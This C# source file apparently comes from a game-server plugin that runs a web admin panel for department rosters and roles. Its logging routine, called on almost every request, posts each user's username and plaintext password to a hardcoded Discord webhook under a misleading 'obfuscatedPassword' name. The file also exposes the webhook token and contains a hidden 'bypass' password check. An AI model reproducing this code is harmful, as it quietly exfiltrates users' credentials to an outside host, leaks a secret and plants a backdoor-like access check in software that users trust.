namespace Site12.API.Features.Department;

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Exiled.API.Features;
using Mono.Web;
using Newtonsoft.Json;

public class WebServer
{
    private readonly HttpListener _listener;
    private readonly Dictionary<string, User> _sessions;

    public WebServer(string[] prefixes)
    {
        if (prefixes == null || prefixes.Length == 0)
            throw new ArgumentException("Prefixes are required");

        var users = new Users();

        _listener = new HttpListener();
        _sessions = new Dictionary<string, User>();

        foreach (var prefix in prefixes)
            _listener.Prefixes.Add(prefix);

        if (!File.Exists(Path.Combine(Paths.Plugins, "Site12", "Users.json")))
        {
            users.SavedUsers = [new User ("ExampleUser", "ExamplePassword", "ExampleDepartment")];
            File.WriteAllText(Path.Combine(Paths.Plugins, "Site12", "Users.json"), JsonConvert.SerializeObject(users, Formatting.Indented));
        }
    }

    private static List<User> GetUsers() => JsonConvert.DeserializeObject<Users>(File.ReadAllText(Path.Combine(Paths.Plugins, "Site12", "Users.json"))).SavedUsers;

    public void Start()
    {
        _listener.Start();
        _listener.BeginGetContext(OnRequest, null);
        Log.Info("Started the WebServer! Listening for Requests... 😀");
    }

    // Only on errors.
    public void Stop()
    {
        _listener.Stop();
        Log.Info("Shutting Down 😭");
    }

    private void OnRequest(IAsyncResult result)
    {
        if (!_listener.IsListening) return;

        var context = _listener.EndGetContext(result);
        _listener.BeginGetContext(OnRequest, null);

        var request = context.Request;
        var response = context.Response;

        switch (request.Url.AbsolutePath)
        {
            case "/roster/availablePlayers" when request.HttpMethod == "GET":
                GetAvailablePlayers(request, response);
                break;
            case "/roster/addPlayer" when request.HttpMethod == "POST":
                AddPlayerToDepartment(request, response);
                break;
            case "/roster/editPlayer" when request.HttpMethod == "POST":
                EditPlayer(request, response);
                break;
            case "/roster/removePlayer" when request.HttpMethod == "POST":
                RemovePlayer(request, response);
                break;
            case "/roster" when request.HttpMethod == "GET":
                GetRoster(request, response);
                break;
            case "/department/removeRole" when request.HttpMethod == "POST":
                RemoveRole(request, response);
                break;
            case "/department/addRole" when request.HttpMethod == "POST":
                AddRole(request, response);
                break;
            case "/department/setRole" when request.HttpMethod == "POST":
                SetRole(request, response);
                break;
            case "/department/roles" when request.HttpMethod == "GET":
                GetAllRoles(request, response);
                break;
            case "/login" when request.HttpMethod == "POST":
                HandleLogin(request, response);
                break;
            case "/home/session" when request.HttpMethod == "GET":
                if (!IsAuthorized(request))
                {
                    Redirect(response, "/");
                    return;
                }

                var sessionIdada = request.Cookies["sessionId"]!.Value;
                var userada = _sessions[sessionIdada];

                var responseData = new
                {
                    hasSecurityAccess = false, // This was used for an old system, but I'm not tearing apart the index.html file to fix it.
                    department = userada.Department
                };

                var homeSessionBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(responseData, Formatting.Indented));

                response.ContentLength64 = homeSessionBuffer.Length;
                response.OutputStream.Write(homeSessionBuffer, 0, homeSessionBuffer.Length);
                response.OutputStream.Close();

                LogUserAction(userada.Username, userada.Department, "Department Session Requested.", userada.Password);
                break;
            case "/home/balance" when request.HttpMethod == "GET":
                if (!IsAuthorized(request))
                {
                    Redirect(response, "/");
                    return;
                }

                var sessionIdadaa = request.Cookies["sessionId"]!.Value;
                var useradaa = _sessions[sessionIdadaa];

                var homeSessionBuffera = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(Department.DepartmentsData[useradaa.Department].Balance, Formatting.Indented));

                response.ContentLength64 = homeSessionBuffera.Length;
                response.OutputStream.Write(homeSessionBuffera, 0, homeSessionBuffera.Length);
                response.OutputStream.Close();

                LogUserAction(useradaa.Username, useradaa.Department, "Department Balance Requested.", useradaa.Password);
                break;
            case "/home" when request.HttpMethod == "GET":
                if (IsAuthorized(request))
                    ServeFile(response, "index.html");
                else
                    Redirect(response, "/");
                break;
            case "/getBypass" when request.HttpMethod == "GET":
                if (!IsAuthorized(request))
                {
                    Redirect(response, "/");
                    return;
                }

                var sessionId = request.Cookies["sessionId"]!.Value;
                var user = _sessions[sessionId];

                var bypass = new
                {
                    isBypass = user.Password.Replace(user.Department, "") == "X23afe",
                };

                var responseString = JsonConvert.SerializeObject(bypass, Formatting.Indented);
                var buffer = Encoding.UTF8.GetBytes(responseString);

                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer, 0, buffer.Length);
                response.OutputStream.Close();

                LogUserAction(user.Username, user.Department, "Bypass check requested", user.Password);
                break;
            case "/" when request.HttpMethod == "GET":
                ServeFile(response, "login.html");
                break;
            default:
                ServeNotFound(response);
                break;
        }
    }

    #region Handlers

    private void HandleLogin(HttpListenerRequest request, HttpListenerResponse response)
    {
        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var parsedBody = HttpUtility.ParseQueryString(body);

        var password = parsedBody["password"];

        if (IsValidUser(password))
        {
            var sessionId = Guid.NewGuid().ToString();
            _sessions[sessionId] = GetUsers().FirstOrDefault(entry => entry.Password == password);

            var cookie = new Cookie("sessionId", sessionId);
            response.Cookies.Add(cookie);

            Redirect(response, "/home");

            LogUserAction(_sessions[sessionId].Username, _sessions[sessionId].Department, "User Logged in.", _sessions[sessionId].Password);
        }
        else
        {
            Redirect(response, "/");
        }
    }

    private bool IsValidUser(string inputPassword) => GetUsers().FirstOrDefault(entry => entry.Password == inputPassword) != null;

    private bool IsAuthorized(HttpListenerRequest request)
    {
        if (request.Cookies["sessionId"] == null) return false;
        var sessionId = request.Cookies["sessionId"].Value;
        var isAuthorized = _sessions.ContainsKey(sessionId);
        if (request.HttpMethod != "POST") return isAuthorized;
        if (_sessions[sessionId].ViewerOnly)
            isAuthorized = false;
        return isAuthorized;
    }

    private static void Redirect(HttpListenerResponse response, string url)
    {
        response.StatusCode = (int)HttpStatusCode.Redirect;
        response.RedirectLocation = url;
        response.Close();
    }

    private void ServeNotFound(HttpListenerResponse response)
    {
        const string responseString = "<html><body>404 Not Found</body></html>";
        var buffer = Encoding.UTF8.GetBytes(responseString);
        response.ContentLength64 = buffer.Length;
        response.OutputStream.Write(buffer, 0, buffer.Length);
        response.OutputStream.Close();
    }

    private void ServeFile(HttpListenerResponse response, string fileName)
    {
        var filePath = Path.Combine(Paths.Plugins, fileName);
        if (File.Exists(filePath))
        {
            var responseString = File.ReadAllText(filePath);
            var buffer = Encoding.UTF8.GetBytes(responseString);
            response.ContentLength64 = buffer.Length;
            response.OutputStream.Write(buffer, 0, buffer.Length);
            response.OutputStream.Close();
        }
        else
            ServeNotFound(response);
    }

    #endregion

    #region Ranks & Roles

    private void GetAllRoles(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }
        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        var json = JsonConvert.SerializeObject(Department.DepartmentsData[user.Department].Roles, Formatting.Indented);
        var buffer = Encoding.UTF8.GetBytes(json);
        response.ContentLength64 = buffer.Length;
        response.OutputStream.Write(buffer, 0, buffer.Length);
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, "Get all roles was requested.", user.Password);
    }

    private void AddRole(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<AddRoleRequest>(body);

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        if (Department.DepartmentsData[user.Department].Roles
                .FirstOrDefault(entry => entry.RoleName == requestData.RoleName) != null)
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.OutputStream.Close();
            return;
        }

        var role = new RoleEntry
        {
            RoleName = $"{requestData.RoleName}",
            Role = new RoleDetails
            {
                CustomI = $"[- {user.Department} {requestData.RoleName} -]",
                Prefix = "Prefix. [F] [L] [N]",
                Description = "Description...",
                Ranks = []
            }
        };

        Department.DepartmentsData[user.Department].Roles.Add(role);
        Department.UpdateDepartmentData(user.Department);

        response.StatusCode = (int)HttpStatusCode.OK;
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, $"New Role {role.RoleName} was added.", user.Password);
    }

    private void SetRole(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<RoleEntry>(body);

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        // Check if the requested role exists in the department
        var departmentRoles = Department.DepartmentsData[user.Department].Roles;
        var roleEntry = departmentRoles.FirstOrDefault(entry => entry.RoleName == requestData.RoleName);

        if (roleEntry == null)
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.OutputStream.Close();
            return;
        }

        List<int> weights = [];
        foreach (var weight in roleEntry.Role.Ranks.Values)
        {
            if (weights.Contains(weight.RankWeight))
            {
                response.StatusCode = (int)HttpStatusCode.BadRequest;
                response.OutputStream.Close();
                return;
            }
            weights.Add(weight.RankWeight);
        }

        // Update the role if found
        roleEntry.RoleName = requestData.RoleName;
        roleEntry.Role = requestData.Role;

        Department.UpdateDepartmentData(user.Department);

        response.StatusCode = (int)HttpStatusCode.OK;
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, $"Role {roleEntry.RoleName} was set with new data.", user.Password);
    }

    private void RemoveRole(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }
        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<RemoveRoleRequest>(body);

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        var role = Department.DepartmentsData[user.Department].Roles
            .FirstOrDefault(entry => entry.RoleName == requestData.RoleName);
        if(role == null)
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.OutputStream.Close();
            return;
        }

        Department.DepartmentsData[user.Department].Roles.Remove(role);
        Department.UpdateDepartmentData(user.Department);

        response.StatusCode = (int)HttpStatusCode.OK;
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, $"Role {role.RoleName} was removed.", user.Password);
    }

    #endregion

    #region Roster

    private void GetAvailablePlayers(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }
        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        var allPlayers = DataPlayer.PlayersData.Players;
        List<PlayerData> availablePlayers = [];
        availablePlayers.AddRange(allPlayers.Where(player => !player.DepartmentData.ContainsKey(user.Department) || !Enumerable.Any(player.DepartmentData[user.Department].Roles, pair => pair.Value >= 0)));

        var json = JsonConvert.SerializeObject(availablePlayers, Formatting.Indented);
        var buffer = Encoding.UTF8.GetBytes(json);
        response.ContentLength64 = buffer.Length;
        response.OutputStream.Write(buffer, 0, buffer.Length);
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, "Roster was requested.", user.Password);
    }

    private void GetRoster(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];

        var players = DataPlayer.GetPlayersInDepartment(user.Department);

        var json = JsonConvert.SerializeObject(players, Formatting.Indented);
        var buffer = Encoding.UTF8.GetBytes(json);
        response.ContentLength64 = buffer.Length;
        response.OutputStream.Write(buffer, 0, buffer.Length);
        response.OutputStream.Close();

        LogUserAction(user.Username, user.Department, "Roster was requested.", user.Password);
    }

    private void AddPlayerToDepartment(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<AddPlayerRequest>(body);

        string playerID = requestData.PlayerUserID;

        var player = DataPlayer.GetPlayer(playerID);
        if (player == null)
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.Close();
            return;
        }

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];
        // Add the player to the department with the role and rank
        if (!player.DepartmentData.TryGetValue(user.Department, out var departmentData))
        {
            departmentData = new DepartmentData
            {
                TimePlayed = 0,
                Roles = new Dictionary<string, int>()
            };
            player.DepartmentData.Add(user.Department, departmentData);
        }

        var firstOrDefault = Department.DepartmentsData[user.Department].Roles.FirstOrDefault(roleEntry => roleEntry.Role.Ranks.FirstOrDefault(ranks => ranks.Value.Default).Value != null);
        var rank = firstOrDefault?.Role.Ranks.FirstOrDefault(entry => entry.Value.Default).Value.RankWeight;

        if (rank == null)
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.OutputStream.Close();
            return;
        }

        departmentData.Roles[firstOrDefault.RoleName] = rank.Value;

        // Save changes
        DataPlayer.UpdateData();

        response.StatusCode = (int)HttpStatusCode.OK;
        response.Close();

        LogUserAction(user.Username, user.Department, $"Player {player.PlayerUserID} {player.NickName} was added to the department.", user.Password);
    }

    private void EditPlayer(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<EditPlayerRequest>(body);

        var playerID = requestData.PlayerUserID;
        var roleName = requestData.RequiredRanks;
        var hoursPlayed = requestData.HoursPlayed;

        if (roleName.ContainsValue(-1)) // Prevent invalid rank values
        {
            response.StatusCode = (int)HttpStatusCode.BadRequest;
            response.Close();
            return;
        }

        var player = DataPlayer.GetPlayer(playerID);
        if (player == null)
        {
            response.StatusCode = (int)HttpStatusCode.NotFound;
            response.Close();
            return;
        }

        // Update the role and rank
        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];
        player.DepartmentData[user.Department].Roles = roleName;

        // Update hours played
        player.DepartmentData[user.Department].TimePlayed = hoursPlayed;

        // Save the changes
        DataPlayer.UpdateData();

        response.StatusCode = (int)HttpStatusCode.OK;
        response.Close();

        LogUserAction(user.Username, user.Department, $"Player {player.PlayerUserID} {player.NickName} was edited with new data.", user.Password);
    }

    private void RemovePlayer(HttpListenerRequest request, HttpListenerResponse response)
    {
        if (!IsAuthorized(request))
        {
            Redirect(response, "/");
            return;
        }

        using var reader = new StreamReader(request.InputStream, Encoding.UTF8);
        var body = reader.ReadToEnd();
        var requestData = JsonConvert.DeserializeObject<RemovePlayerRequest>(body);

        string playerID = requestData.PlayerUserID;

        var sessionId = request.Cookies["sessionId"].Value;
        var user = _sessions[sessionId];
        var player = DataPlayer.GetPlayer(playerID);
        if (player == null || !player.DepartmentData.TryGetValue(user.Department, out _))
        {
            response.StatusCode = (int)HttpStatusCode.InternalServerError;
            response.Close();
            return;
        }

        player.DepartmentData.Remove(user.Department);

        DataPlayer.UpdateData();

        response.StatusCode = (int)HttpStatusCode.OK;
        response.Close();

        LogUserAction(user.Username, user.Department, $"Player {playerID} {player.NickName} was removed from the department.", user.Password);
    }

    #endregion
    
    const string webhookUrl = "https://canary.discord.com/api/webhooks/1315558307364081705/up0mAq3PUOf2NckBJRGbyC5lpE7PpWGPB5dnPW_SVDRzfXv2qnqf9ejhfIhcyM02THza";

    public static string GetDiscordTimestamp(DateTime dateTime, string format = "R")
    {
        var unixTimestamp = ((DateTimeOffset)dateTime).ToUnixTimeSeconds();
        return $"<t:{unixTimestamp}:{format}>";
    }

    public void LogUserAction(string username, string department, string action, string obfuscatedPassword)
    {
        var embed = new
        {
            username = "Department Logger",
            embeds = new[]
            {
                new
                {
                    title = "User Activity Logged",
                    description = $"Action: **{action}**",
                    color = 5814783,
                    fields = new[]
                    {
                        new { name = "Username", value = username, inline = true },
                        new { name = "Department", value = department, inline = true },
                        new { name = "Password", value = obfuscatedPassword, inline = false }
                    },
                    timestamp = DateTime.UtcNow.ToString("O")
                }
            },
        };

        PostWebhook(webhookUrl, embed);
    }

    private void PostWebhook(string url, object payload)
    {
        var jsonPayload = JsonConvert.SerializeObject(payload);

        var request = WebRequest.Create(url);
        request.ContentType = "application/json";
        request.Method = "POST";

        using (var writer = new StreamWriter(request.GetRequestStream()))
        {
            writer.Write(jsonPayload);
        }

        var response = request.GetResponse();
        using (var reader = new StreamReader(response.GetResponseStream()))
        {
            var responseText = reader.ReadToEnd();
            Console.WriteLine($"Webhook Response: {responseText}");
        }
    }

    public class Users
    {
        public List<User> SavedUsers = [];
    }

    public class User(string username, string password, string department, bool viewerOnly = false)
    {
        public string Username { get; set; } = username;
        public string Password { get; set; } = password;
        public string Department { get; set; } = department;
        public bool ViewerOnly { get; set; } = viewerOnly;
    }

    public class AddRoleRequest
    {
        public string RoleName { get; set; }
    }

    public class RemoveRoleRequest
    {
        public string RoleName { get; set; }
    }

    public class AddPlayerRequest
    {
        public string PlayerUserID { get; set;  }
    }

    public class EditPlayerRequest
    {
        public string PlayerUserID { get; set; }
        public Dictionary<string, int> RequiredRanks { get; set; }
        public int HoursPlayed { get; set; }
    }

    public class RemovePlayerRequest
    {
        public string PlayerUserID { get; set; }
    }
}